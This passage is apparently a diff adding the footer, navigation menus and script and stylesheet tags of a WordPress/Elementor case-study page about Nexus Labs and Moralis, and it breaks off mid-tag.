+                    class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-vertical e--pointer-none"
+                  >
+                    <ul
+                      id="menu-1-63ac917"
+                      class="elementor-nav-menu sm-vertical"
+                      data-smartmenus-id="17530836116246487"
+                    >
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109260"
+                      >
+                        <a href="/chains/ethereum/" class="elementor-item"
+                          >Ethereum</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-126270"
+                      >
+                        <a href="/chains/base/" class="elementor-item"
+                          ><span style="width: 100%"
+                            >Base
+                            <span class="labelSpan redSup">hot</span></span
+                          ></a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-114140"
+                      >
+                        <a href="/chains/solana/" class="elementor-item"
+                          >Solana</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-111765"
+                      >
+                        <a href="/chains/bnb/" class="elementor-item"
+                          >BNB Smart Chain</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109261"
+                      >
+                        <a href="/chains/polygon/" class="elementor-item"
+                          >Polygon</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-112793"
+                      >
+                        <a href="/chains/avalanche/" class="elementor-item"
+                          >Avalanche</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-122688"
+                      >
+                        <a href="/chains/chiliz/" class="elementor-item"
+                          >Chiliz</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-123025"
+                      >
+                        <a href="/chains/gnosis/" class="elementor-item"
+                          >Gnosis</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-112794"
+                      >
+                        <a href="/chains/cronos/" class="elementor-item"
+                          >Cronos</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-112795"
+                      >
+                        <a href="/chains/fantom/" class="elementor-item"
+                          >Fantom</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-112799"
+                      >
+                        <a href="/chains/arbitrum/" class="elementor-item"
+                          >Arbitrum</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-112796"
+                      >
+                        <a href="/chains/optimism/" class="elementor-item"
+                          >Optimism</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-139407"
+                      >
+                        <a href="/chains/linea/" class="elementor-item"
+                          >Linea</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-139406"
+                      >
+                        <a href="/chains/moonbeam/" class="elementor-item"
+                          >Moonbeam</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-147287"
+                      >
+                        <a href="/chains/flow/" class="elementor-item">Flow</a>
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-148131"
+                      >
+                        <a href="/chains/lisk/" class="elementor-item">Lisk</a>
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-148132"
+                      >
+                        <a href="/chains/ronin/" class="elementor-item"
+                          >Ronin</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-151260"
+                      >
+                        <a href="/chains/pulsechain/" class="elementor-item"
+                          >PulseChain</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146345"
+                      >
+                        <a href="/nodes/opbnb/" class="elementor-item">opBNB</a>
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146348"
+                      >
+                        <a href="/nodes/zksync/" class="elementor-item"
+                          >zkSync</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146346"
+                      >
+                        <a href="/nodes/polygon-zkevm/" class="elementor-item"
+                          >Polygon zkEVM</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146347"
+                      >
+                        <a href="/nodes/zetachain/" class="elementor-item"
+                          >Zetachain</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146343"
+                      >
+                        <a href="/nodes/blast/" class="elementor-item">Blast</a>
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146344"
+                      >
+                        <a href="/nodes/mantle/" class="elementor-item"
+                          >Mantle</a
+                        >
+                      </li>
+                    </ul>
+                  </nav>
+                  <nav
+                    class="elementor-nav-menu--dropdown elementor-nav-menu__container"
+                    aria-hidden="true"
+                  >
+                    <ul
+                      id="menu-2-63ac917"
+                      class="elementor-nav-menu sm-vertical"
+                      data-smartmenus-id="17530836116252786"
+                    >
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109260"
+                      >
+                        <a
+                          href="/chains/ethereum/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Ethereum</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-126270"
+                      >
+                        <a
+                          href="/chains/base/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          ><span style="width: 100%"
+                            >Base
+                            <span class="labelSpan redSup">hot</span></span
+                          ></a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-114140"
+                      >
+                        <a
+                          href="/chains/solana/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Solana</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-111765"
+                      >
+                        <a
+                          href="/chains/bnb/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >BNB Smart Chain</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109261"
+                      >
+                        <a
+                          href="/chains/polygon/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Polygon</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-112793"
+                      >
+                        <a
+                          href="/chains/avalanche/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Avalanche</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-122688"
+                      >
+                        <a
+                          href="/chains/chiliz/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Chiliz</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-123025"
+                      >
+                        <a
+                          href="/chains/gnosis/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Gnosis</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-112794"
+                      >
+                        <a
+                          href="/chains/cronos/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Cronos</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-112795"
+                      >
+                        <a
+                          href="/chains/fantom/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Fantom</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-112799"
+                      >
+                        <a
+                          href="/chains/arbitrum/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Arbitrum</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-112796"
+                      >
+                        <a
+                          href="/chains/optimism/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Optimism</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-139407"
+                      >
+                        <a
+                          href="/chains/linea/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Linea</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-139406"
+                      >
+                        <a
+                          href="/chains/moonbeam/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Moonbeam</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-147287"
+                      >
+                        <a
+                          href="/chains/flow/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Flow</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-148131"
+                      >
+                        <a
+                          href="/chains/lisk/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Lisk</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-148132"
+                      >
+                        <a
+                          href="/chains/ronin/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Ronin</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-151260"
+                      >
+                        <a
+                          href="/chains/pulsechain/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >PulseChain</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146345"
+                      >
+                        <a
+                          href="/nodes/opbnb/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >opBNB</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146348"
+                      >
+                        <a
+                          href="/nodes/zksync/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >zkSync</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146346"
+                      >
+                        <a
+                          href="/nodes/polygon-zkevm/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Polygon zkEVM</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146347"
+                      >
+                        <a
+                          href="/nodes/zetachain/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Zetachain</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146343"
+                      >
+                        <a
+                          href="/nodes/blast/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Blast</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-nodes menu-item-146344"
+                      >
+                        <a
+                          href="/nodes/mantle/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Mantle</a
+                        >
+                      </li>
+                    </ul>
+                  </nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div
+            class="elementor-element elementor-element-acb6a34 e-con-full e-flex e-con e-child"
+            data-id="acb6a34"
+            data-element_type="container"
+          >
+            <div
+              class="elementor-element elementor-element-e7deaa0 e-con-full e-flex e-con e-child"
+              data-id="e7deaa0"
+              data-element_type="container"
+            >
+              <div
+                class="elementor-element elementor-element-9d15f21 elementor-align-left elementor-widget__width-initial elementor-widget elementor-widget-button"
+                data-id="9d15f21"
+                data-element_type="widget"
+                data-widget_type="button.default"
+              >
+                <div class="elementor-widget-container">
+                  <div class="elementor-button-wrapper">
+                    <a
+                      class="elementor-button elementor-button-link elementor-size-sm"
+                      target="_blank"
+                      aria-label="SOC 2 Security Page"
+                    >
+                      <span class="elementor-button-content-wrapper">
+                        <span class="elementor-button-icon">
+                          <i aria-hidden="true" class="fas fa-arrow-right"></i>
+                        </span>
+                        <span class="elementor-button-text"
+                          ><img
+                            src="https://moralis.com/wp-content/uploads/2024/08/SOC2.svg"
+                            alt="SOC2 Certified"
+                            title="SOC2 Certified"
+                            loading="lazy"
+                            width="27.489"
+                            height="32"
+                          /><span>SOC 2<br />Type II Certified</span></span
+                        >
+                      </span>
+                    </a>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-ad523dd elementor-nav-menu__align-center m_footer_options elementor-nav-menu--dropdown-none elementor-widget elementor-widget-nav-menu"
+                data-id="ad523dd"
+                data-element_type="widget"
+                data-settings='{"submenu_icon":{"value":"<i class=\"\"><\/i>","library":""},"layout":"horizontal"}'
+                data-widget_type="nav-menu.default"
+              >
+                <div class="elementor-widget-container">
+                  <nav
+                    aria-label="Menu"
+                    class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-horizontal e--pointer-none"
+                  >
+                    <ul
+                      id="menu-1-ad523dd"
+                      class="elementor-nav-menu"
+                      data-smartmenus-id="17530836116313687"
+                    >
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-97191"
+                      >
+                        <a rel="privacy-policy" class="elementor-item"
+                          >Privacy Policy</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97193"
+                      >
+                        <a class="elementor-item">Terms</a>
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97192"
+                      >
+                        <a class="elementor-item">Cookie Policy</a>
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-98211"
+                      >
+                        <a class="elementor-item">Security Policy</a>
+                      </li>
+                    </ul>
+                  </nav>
+                  <nav
+                    class="elementor-nav-menu--dropdown elementor-nav-menu__container"
+                    aria-hidden="true"
+                  >
+                    <ul
+                      id="menu-2-ad523dd"
+                      class="elementor-nav-menu"
+                      data-smartmenus-id="17530836116322559"
+                    >
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-97191"
+                      >
+                        <a
+                          rel="privacy-policy"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Privacy Policy</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97193"
+                      >
+                        <a class="elementor-item" tabindex="-1">Terms</a>
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97192"
+                      >
+                        <a class="elementor-item" tabindex="-1"
+                          >Cookie Policy</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-98211"
+                      >
+                        <a class="elementor-item" tabindex="-1"
+                          >Security Policy</a
+                        >
+                      </li>
+                    </ul>
+                  </nav>
+                </div>
+              </div>
+            </div>
+            <div
+              class="elementor-element elementor-element-d068e55 e-con-full e-flex e-con e-child"
+              data-id="d068e55"
+              data-element_type="container"
+            >
+              <div
+                class="elementor-element elementor-element-1330ff1 elementor-widget__width-inherit m_footer_social_icon elementor-widget elementor-widget-html"
+                data-id="1330ff1"
+                data-element_type="widget"
+                data-widget_type="html.default"
+              >
+                <div class="elementor-widget-container">
+                  <a
+                    target="_blank"
+                    aria-label=" Blocklith Youtube Link"
+                    rel="nofollow"
+                  >
+                    <i aria-hidden="true" class="fab fa-youtube"></i>
+                  </a>
+
+                  <a target="_blank" aria-label=" Blocklith Twitter Link">
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="22"
+                      height="20"
+                      viewBox="0 0 22 20"
+                      fill="none"
+                    >
+                      <path
+                        d="M17.244 0.25H20.552L13.325 8.51L21.827 19.75H15.17L9.956 12.933L3.99 19.75H0.68L8.41 10.915L0.254 0.25H7.08L11.793 6.481L17.244 0.25ZM16.083 17.77H17.916L6.084 2.126H4.117L16.083 17.77Z"
+                        fill="#041836"
+                      ></path>
+                    </svg>
+                  </a>
+
+                  <a
+                    target="_blank"
+                    aria-label=" Blocklith LinkedIn Link"
+                    rel="nofollow"
+                  >
+                    <i aria-hidden="true" class="fab fa-linkedin"></i>
+                  </a>
+
+                  <a
+                    target="_blank"
+                    aria-label=" Blocklith Discord Link"
+                    rel="nofollow"
+                  >
+                    <i aria-hidden="true" class="fab fa-discord"></i>
+                  </a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script type="speculationrules">
+      {
+        "prefetch": [
+          {
+            "source": "document",
+            "where": {
+              "and": [
+                { "href_matches": "\/*" },
+                {
+                  "not": {
+                    "href_matches": [
+                      "\/wp-*.php",
+                      "\/wp-admin\/*",
+                      "\/wp-content\/uploads\/*",
+                      "\/wp-content\/*",
+                      "\/wp-content\/plugins\/*",
+                      "\/wp-content\/themes\/hello-elementor-child\/*",
+                      "\/wp-content\/themes\/hello-elementor\/*",
+                      "\/*\\?(.+)"
+                    ]
+                  }
+                },
+                { "not": { "selector_matches": "a[rel~=\"nofollow\"]" } },
+                {
+                  "not": { "selector_matches": ".no-prefetch, .no-prefetch a" }
+                }
+              ]
+            },
+            "eagerness": "conservative"
+          }
+        ]
+      }
+    </script>
+    <div
+      class="asp_hidden_data"
+      id="asp_hidden_data"
+      style="display: none !important"
+    >
+      <svg style="position: absolute" height="0" width="0">
+        <filter id="aspblur">
+          <feGaussianBlur in="SourceGraphic" stdDeviation="4"></feGaussianBlur>
+        </filter>
+      </svg>
+      <svg style="position: absolute" height="0" width="0">
+        <filter id="no_aspblur"></filter>
+      </svg>
+    </div>
+
+    <script>
+      const lazyloadRunObserver = () => {
+        const lazyloadBackgrounds = document.querySelectorAll(
+          `.e-con.e-parent:not(.e-lazyloaded)`
+        );
+        const lazyloadBackgroundObserver = new IntersectionObserver(
+          (entries) => {
+            entries.forEach((entry) => {
+              if (entry.isIntersecting) {
+                let lazyloadBackground = entry.target;
+                if (lazyloadBackground) {
+                  lazyloadBackground.classList.add("e-lazyloaded");
+                }
+                lazyloadBackgroundObserver.unobserve(entry.target);
+              }
+            });
+          },
+          { rootMargin: "200px 0px 200px 0px" }
+        );
+        lazyloadBackgrounds.forEach((lazyloadBackground) => {
+          lazyloadBackgroundObserver.observe(lazyloadBackground);
+        });
+      };
+      const events = ["DOMContentLoaded", "elementor/lazyload/observe"];
+      events.forEach((event) => {
+        document.addEventListener(event, lazyloadRunObserver);
+      });
+    </script>
+    <link
+      rel="stylesheet"
+      id="elementor-post-145582-css"
+      href="https://moralis.com/wp-content/uploads/elementor/css/post-145582.css?ver=1751282596"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="widget-icon-list-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/css/widget-icon-list.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-post-151345-css"
+      href="https://moralis.com/wp-content/uploads/elementor/css/post-151345.css?ver=1751282597"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="e-popup-css"
+      href="https://moralis.com/wp-content/plugins/elementor-pro/assets/css/conditionals/popup.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-post-143729-css"
+      href="https://moralis.com/wp-content/uploads/elementor/css/post-143729.css?ver=1750974745"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="widget-form-css"
+      href="https://moralis.com/wp-content/plugins/elementor-pro/assets/css/widget-form.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-gf-local-ibmplexsans-css"
+      href="https://moralis.com/wp-content/uploads/elementor/google-fonts/css/ibmplexsans.css?ver=1750672135"
+      media="all"
+    />
+    <script
+      src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js?ver=1.2.74.0"
+      id="mo-google-webfont-js"
+    ></script>
+    <script id="mailoptin-js-extra">
+      var mailoptin_globals = {
+        public_js:
+          "https:\/\/moralis.com\/wp-content\/plugins\/mailoptin\/src\/core\/src\/assets\/js\/src",
+        public_sound:
+          "https:\/\/moralis.com\/wp-content\/plugins\/mailoptin\/src\/core\/src\/assets\/sound\/",
+        mailoptin_ajaxurl:
+          "\/case-studies\/nexus-labs\/?mailoptin-ajax=%%endpoint%%",
+        is_customize_preview: "false",
+        disable_impression_tracking: "false",
+        sidebar: "0",
+        js_required_title: "Title is required.",
+        is_new_returning_visitors_cookies: "false",
+      };
+    </script>
+    <script
+      src="https://moralis.com/wp-content/plugins/mailoptin/src/core/src/assets/js/mailoptin.min.js?ver=1.2.74.0"
+      id="mailoptin-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3"
+      id="jquery-ui-core-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.3"
+      id="jquery-ui-mouse-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-includes/js/jquery/ui/slider.min.js?ver=1.13.3"
+      id="jquery-ui-slider-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-includes/js/jquery/ui/draggable.min.js?ver=1.13.3"
+      id="jquery-ui-draggable-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-includes/js/jquery/jquery.ui.touch-punch.js?ver=0.2.2"
+      id="jquery-touch-punch-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.29.2"
+      id="elementor-webpack-runtime-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.29.2"
+      id="elementor-frontend-modules-js"
+    ></script>
+    <script id="elementor-frontend-js-before">
+      var elementorFrontendConfig = {
+        environmentMode: {
+          edit: false,
+          wpPreview: false,
+          isScriptDebug: false,
+        },
+        i18n: {
+          shareOnFacebook: "Share on Facebook",
+          shareOnTwitter: "Share on Twitter",
+          pinIt: "Pin it",
+          download: "Download",
+          downloadImage: "Download image",
+          fullscreen: "Fullscreen",
+          zoom: "Zoom",
+          share: "Share",
+          playVideo: "Play Video",
+          previous: "Previous",
+          next: "Next",
+          close: "Close",
+          a11yCarouselPrevSlideMessage: "Previous slide",
+          a11yCarouselNextSlideMessage: "Next slide",
+          a11yCarouselFirstSlideMessage: "This is the first slide",
+          a11yCarouselLastSlideMessage: "This is the last slide",
+          a11yCarouselPaginationBulletMessage: "Go to slide",
+        },
+        is_rtl: false,
+        breakpoints: { xs: 0, sm: 480, md: 768, lg: 1025, xl: 1440, xxl: 1600 },
+        responsive: {
+          breakpoints: {
+            mobile: {
+              label: "Mobile Portrait",
+              value: 767,
+              default_value: 767,
+              direction: "max",
+              is_enabled: true,
+            },
+            mobile_extra: {
+              label: "Mobile Landscape",
+              value: 880,
+              default_value: 880,
+              direction: "max",
+              is_enabled: false,
+            },
+            tablet: {
+              label: "Tablet Portrait",
+              value: 1024,
+              default_value: 1024,
+              direction: "max",
+              is_enabled: true,
+            },
+            tablet_extra: {
+              label: "Tablet Landscape",
+              value: 1200,
+              default_value: 1200,
+              direction: "max",
+              is_enabled: false,
+            },
+            laptop: {
+              label: "Laptop",
+              value: 1366,
+              default_value: 1366,
+              direction: "max",
+              is_enabled: false,
+            },
+            widescreen: {
+              label: "Widescreen",
+              value: 2400,
+              default_value: 2400,
+              direction: "min",
+              is_enabled: false,
+            },
+          },
+          hasCustomBreakpoints: false,
+        },
+        version: "3.29.2",
+        is_static: false,
+        experimentalFeatures: {
+          additional_custom_breakpoints: true,
+          container: true,
+          e_local_google_fonts: true,
+          theme_builder_v2: true,
+          "landing-pages": true,
+          "nested-elements": true,
+          editor_v2: true,
+          home_screen: true,
+          "cloud-library": true,
+          e_opt_in_v4_page: true,
+          "mega-menu": true,
+        },
+        urls: {
+          assets:
+            "https:\/\/moralis.com\/wp-content\/plugins\/elementor\/assets\/",
+          ajaxurl: "https:\/\/moralis.com\/wp-admin\/admin-ajax.php",
+          uploadUrl: "https:\/\/moralis.com\/wp-content\/uploads",
+        },
+        nonces: { floatingButtonsClickTracking: "164218863b" },
+        swiperClass: "swiper",
+        settings: { page: [], editorPreferences: [] },
+        kit: {
+          viewport_mobile: 767,
+          viewport_tablet: 1024,
+          active_breakpoints: ["viewport_mobile", "viewport_tablet"],
+          global_image_lightbox: "yes",
+          lightbox_enable_counter: "yes",
+          lightbox_enable_fullscreen: "yes",
+          lightbox_enable_zoom: "yes",
+          lightbox_enable_share: "yes",
+          lightbox_title_src: "title",
+          lightbox_description_src: "description",
+        },
+        post: {
+          id: 146461,
+          title:
+            "How%20Nexus%20Labs%20Saved%203%20Months%20of%20Work%20with%20Moralis",
+          excerpt: "",
+          featuredImage:
+            "https:\/\/moralis.com\/wp-content\/uploads\/2024\/09\/moralis_nexus_labs_cover-1024x577.webp",
+        },
+      };
+    </script>
+    <script
+      src="https://moralis.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.29.2"
+      id="elementor-frontend-js"
+    ></script>
+    <span id="elementor-device-mode" class="elementor-screen-only"></span>
+    <script
+      src="https://moralis.com/wp-content/plugins/elementor-pro/assets/lib/sticky/jquery.sticky.min.js?ver=3.29.2"
+      id="e-sticky-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/plugins/elementor-pro/assets/lib/smartmenus/jquery.smartmenus.min.js?ver=1.2.1"
+      id="smartmenus-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/plugins/elementor/assets/lib/jquery-numerator/jquery-numerator.min.js?ver=0.2.1"
+      id="jquery-numerator-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=i4r/q2lNz8dEryc"
+      id="enlighterjs-js"
+    ></script>
+    <script id="enlighterjs-js-after">
+      !(function (e, n) {
+        if ("undefined" != typeof EnlighterJS) {
+          var o = {
+            selectors: {
+              block: "pre.EnlighterJSRAW",
+              inline: "code.EnlighterJSRAW",
+            },
+            options: {
+              indent: 2,
+              ampersandCleanup: true,
+              linehover: false,
+              rawcodeDbclick: false,
+              textOverflow: "scroll",
+              linenumbers: false,
+              theme: "wpcustom",
+              language: "js",
+              retainCssClasses: false,
+              collapse: false,
+              toolbarOuter: "",
+              toolbarTop: "{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}",
+              toolbarBottom: "",
+            },
+          };
+          (e.EnlighterJSINIT = function () {
+            EnlighterJS.init(o.selectors.block, o.selectors.inline, o.options);
+          })();
+        } else {
+          ((n && (n.error || n.log)) || function () {})(
+            "Error: EnlighterJS resources not loaded yet!"
+          );
+        }
+      })(window, console);
+    </script>
+    <script
+      src="https://www.google.com/recaptcha/api.js?render=explicit&amp;ver=3.29.2"
+      id="elementor-recaptcha_v3-api-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/plugins/elementor-pro/assets/js/webpack-pro.runtime.min.js?ver=3.29.2"
+      id="elementor-pro-webpack-runtime-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6"
+      id="wp-hooks-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6"
+      id="wp-i18n-js"
+    ></script>
+    <script id="wp-i18n-js-after">
+      wp.i18n.setLocaleData({ "text direction\u0004ltr": ["ltr"] });
+    </script>
+    <script id="elementor-pro-frontend-js-before">
+      var ElementorProFrontendConfig = {
+        ajaxurl: "https:\/\/moralis.com\/wp-admin\/admin-ajax.php",
+        nonce: "608bb01ebe",
+        urls: {
+          assets:
+            "https:\/\/moralis.com\/wp-content\/plugins\/elementor-pro\/assets\/",
+          rest: "https:\/\/moralis.com\/wp-json\/",
+        },
+        settings: { lazy_load_background_images: true },
+        popup: { hasPopUps: true },
+        shareButtonsNetworks: {
+          facebook: { title: "Facebook", has_counter: true },
+          twitter: { title: "Twitter" },
+          linkedin: { title: "LinkedIn", has_counter: true },
+          pinterest: { title: "Pinterest", has_counter: true },
+          reddit: { title: "Reddit", has_counter: true },
+          vk: { title: "VK", has_counter: true },
+          odnoklassniki: { title: "OK", has_counter: true },
+          tumblr: { title: "Tumblr" },
+          digg: { title: "Digg" },
+          skype: { title: "Skype" },
+          stumbleupon: { title: "StumbleUpon", has_counter: true },
+          mix: { title: "Mix" },
+          telegram: { title: "Telegram" },
+          pocket: { title: "Pocket", has_counter: true },
+          xing: { title: "XING", has_counter: true },
+          whatsapp: { title: "WhatsApp" },
+          email: { title: "Email" },
+          print: { title: "Print" },
+          "x-twitter": { title: "X" },
+          threads: { title: "Threads" },
+        },
+        facebook_sdk: { lang: "en_US", app_id: "" },
+        lottie: {
+          defaultAnimationUrl:
+            "https:\/\/moralis.com\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json",
+        },
+      };
+    </script>
+    <script
+      src="https://moralis.com/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.29.2"
+      id="elementor-pro-frontend-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=3.29.2"
+      id="pro-elements-handlers-js"
+    ></script>
+    <svg style="display: none" class="e-font-icon-svg-symbols"></svg>
+    <script
+      src="https://moralis.com/wp-content/plugins/the-plus-addons-for-elementor-page-builder/modules/extensions/equal-height/plus-equal-height.min.js?ver=6.3.9"
+      id="plus-equal-height-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/plugins/the-plus-addons-for-elementor-page-builder/modules/extensions/wrapper-link/plus-section-column-link.min.js?ver=6.3.9"
+      id="plus-section-column-link-js"
+    ></script>
+    <script src="https://moralis.com/wp-content/themes/hello-elementor-child/components/m_footer-scripts_v7.min.js"></script>
+    <script src="https://moralis.com/wp-content/themes/hello-elementor-child/components/pop-up-accessibility-fix_v5.min.js"></script>
+
+    <script
+      defer=""
